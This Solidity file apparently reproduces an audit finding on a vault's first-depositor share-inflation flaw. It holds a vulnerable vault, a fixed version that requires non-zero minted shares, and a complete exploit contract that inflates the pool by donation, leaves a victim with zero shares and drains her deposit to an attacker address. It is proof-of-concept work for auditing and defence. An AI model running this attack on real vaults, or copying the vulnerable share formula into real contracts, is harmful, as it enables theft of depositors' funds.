// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Yield Ninja finding 19124 (Pashov):
// "First vault depositor can steal subsequent depositors' tokens".
//
// The vault mints shares with the classic first-depositor / share-inflation
// formula (verbatim from the report):
//
//     shares = (_amount * totalSupply()) / _pool;
//
// where `_pool = token.balanceOf(vault)` is read BEFORE the deposit is pulled.
// A first depositor mints 1 wei-share, then DONATES underlying straight to the
// vault to inflate `_pool`. The next real depositor's `shares` then rounds down
// to 0 — she is minted nothing for a full 10e18 deposit. The attacker, holding
// the entire (1 wei) share supply, withdraws and drains the whole pool,
// pocketing the victim's deposit. UniswapV2 defeats this with two guards:
// minting the first MINIMUM_LIQUIDITY shares to a dead address AND requiring
// the minted share amount to be non-zero (both modelled in `VaultFixed`).
//
// Only the opaque underlying ERC20 is doubled (MiniToken). The vulnerable
// share-accounting boundary is real, reconstructed faithfully from the report's
// specified mechanism, and carries the verbatim defective line with a `// @>`
// marker. This matches the repo's standard for first-depositor-inflation PoCs.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double for the opaque `underlying` token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault: shares minted with the verbatim first-depositor formula.
// ─────────────────────────────────────────────────────────────────────────────
contract Vault {
    MiniToken public token;
    uint256 private _totalSupply;
    mapping(address => uint256) public balanceOf; // shares

    constructor(address _token) {
        token = MiniToken(_token);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function _mint(address to, uint256 shares) internal {
        _totalSupply += shares;
        balanceOf[to] += shares;
    }

    function _burn(address from, uint256 shares) internal {
        _totalSupply -= shares;
        balanceOf[from] -= shares;
    }

    /// @notice Deposit `_amount` of underlying, minting vault shares.
    function deposit(uint256 _amount) external returns (uint256) {
        // `_pool` is the vault's underlying balance BEFORE this deposit is pulled,
        // so a direct token donation inflates it and zeroes out later depositors.
        uint256 _pool = token.balanceOf(address(this));
        uint256 shares;
        if (totalSupply() == 0) {
            shares = _amount;
        } else {
            shares = (_amount * totalSupply()) / _pool; // @> shares = (_amount * totalSupply()) / _pool;
        }
        token.transferFrom(msg.sender, address(this), _amount);
        _mint(msg.sender, shares);
        return shares;
    }

    /// @notice Burn `_share` vault shares and return the proportional underlying.
    function withdraw(uint256 _share) external returns (uint256) {
        uint256 _amount = (_share * token.balanceOf(address(this))) / totalSupply();
        _burn(msg.sender, _share);
        token.transfer(msg.sender, _amount);
        return _amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault (negative control): UniswapV2's second protection — require the
// minted share amount to be non-zero. This guard directly defeats THIS attack:
// once the attacker inflates `_pool`, the victim's `shares` round to 0 and her
// deposit now REVERTS instead of silently minting nothing, so the attacker can
// never strand her funds. (UniswapV2 additionally locks the first
// MINIMUM_LIQUIDITY shares to a dead address as complementary defense-in-depth
// against share-price manipulation; the non-zero-share guard alone is enough to
// stop the fund theft reported here.)
// ─────────────────────────────────────────────────────────────────────────────
contract VaultFixed {
    MiniToken public token;
    uint256 private _totalSupply;
    mapping(address => uint256) public balanceOf; // shares
    uint256 public constant MINIMUM_LIQUIDITY = 1000; // UniV2 complementary guard

    constructor(address _token) {
        token = MiniToken(_token);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function _mint(address to, uint256 shares) internal {
        _totalSupply += shares;
        balanceOf[to] += shares;
    }

    function _burn(address from, uint256 shares) internal {
        _totalSupply -= shares;
        balanceOf[from] -= shares;
    }

    function deposit(uint256 _amount) external returns (uint256) {
        uint256 _pool = token.balanceOf(address(this));
        uint256 shares;
        if (totalSupply() == 0) {
            shares = _amount;
        } else {
            shares = (_amount * totalSupply()) / _pool;
        }
        require(shares != 0, "INSUFFICIENT_SHARES_MINTED"); // FIX: minted shares must be non-zero
        token.transferFrom(msg.sender, address(this), _amount);
        _mint(msg.sender, shares);
        return shares;
    }

    function withdraw(uint256 _share) external returns (uint256) {
        uint256 _amount = (_share * token.balanceOf(address(this))) / totalSupply();
        _burn(msg.sender, _share);
        token.transfer(msg.sender, _amount);
        return _amount;
    }
}

/// @dev Faithful distinct account for the victim (Alice). A separate contract
///      gives her a real, independent address so her shares/loss are tracked
///      separately from the attacker — no cheatcodes needed.
contract Actor {
    function approveToken(MiniToken t, address spender, uint256 amount) external {
        t.approve(spender, amount);
    }

    function depositVault(Vault v, uint256 amount) external returns (uint256) {
        return v.deposit(amount);
    }

    function underlyingBalance(MiniToken t) external view returns (uint256) {
        return t.balanceOf(address(this));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: attacker seeds 1 wei, donates the victim's-sized deposit to
// inflate the pool, the victim (Alice) deposits 10e18 and is minted 0 shares,
// and the attacker withdraws his single share to drain the whole pool. The net
// stolen underlying (== Alice's deposit) is sent to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant SEED = 1; // 1 wei
    uint256 internal constant DONATION = 10 ether; // inflates _pool before Alice deposits
    uint256 internal constant ALICE_DEPOSIT = 10 ether;

    // Exposed results.
    uint256 public attackerSharesMinted;
    uint256 public aliceSharesMinted;
    uint256 public attackerWithdrawn;
    uint256 public attackerProfit;
    uint256 public aliceLoss;
    uint256 public attackerEoaStolen;
    address public tokenAddr;
    address public vaultAddr;
    address public aliceAddr;

    function run() external payable {
        // --- deploy underlying + vault + victim, fixed order ---
        MiniToken token = new MiniToken("Underlying", "UND"); // nonce 1
        Vault vault = new Vault(address(token)); // nonce 2
        Actor alice = new Actor(); // nonce 3

        tokenAddr = address(token);
        vaultAddr = address(vault);
        aliceAddr = address(alice);

        // --- fund: attacker (this contract) holds seed + donation; Alice holds her deposit ---
        token.mint(address(this), SEED + DONATION);
        token.mint(address(alice), ALICE_DEPOSIT);

        // 1) attacker front-runs: deposit 1 wei -> mints 1 wei-share (whole supply)
        token.approve(address(vault), SEED);
        attackerSharesMinted = vault.deposit(SEED);

        // 2) attacker front-runs: donate underlying straight to the vault to inflate `_pool`
        token.transfer(address(vault), DONATION);

        // 3) victim deposits 10e18 -> shares round down to 0 (she is griefed)
        alice.approveToken(token, address(vault), ALICE_DEPOSIT);
        aliceSharesMinted = alice.depositVault(vault, ALICE_DEPOSIT);

        // 4) attacker back-runs: withdraw his 1 wei-share (== totalSupply) -> drains the pool
        attackerWithdrawn = vault.withdraw(attackerSharesMinted);

        // --- accounting ---
        // Alice got 0 shares and can never redeem: her entire deposit is lost.
        aliceLoss = ALICE_DEPOSIT - alice.underlyingBalance(token);
        // Attacker's net profit above his own seed + donation.
        attackerProfit = attackerWithdrawn - (SEED + DONATION);

        // --- harm: send the stolen underlying (== Alice's deposit) to the attacker EOA ---
        token.transfer(ATTACKER, ALICE_DEPOSIT);
        attackerEoaStolen = token.balanceOf(ATTACKER);

        require(aliceSharesMinted == 0, "victim should have been minted 0 shares");
        require(aliceLoss == ALICE_DEPOSIT, "victim should lose her full deposit");
        require(attackerProfit >= ALICE_DEPOSIT, "attacker should net the victim's deposit");
        require(attackerEoaStolen >= ALICE_DEPOSIT, "stolen underlying must reach attacker EOA");
    }
}
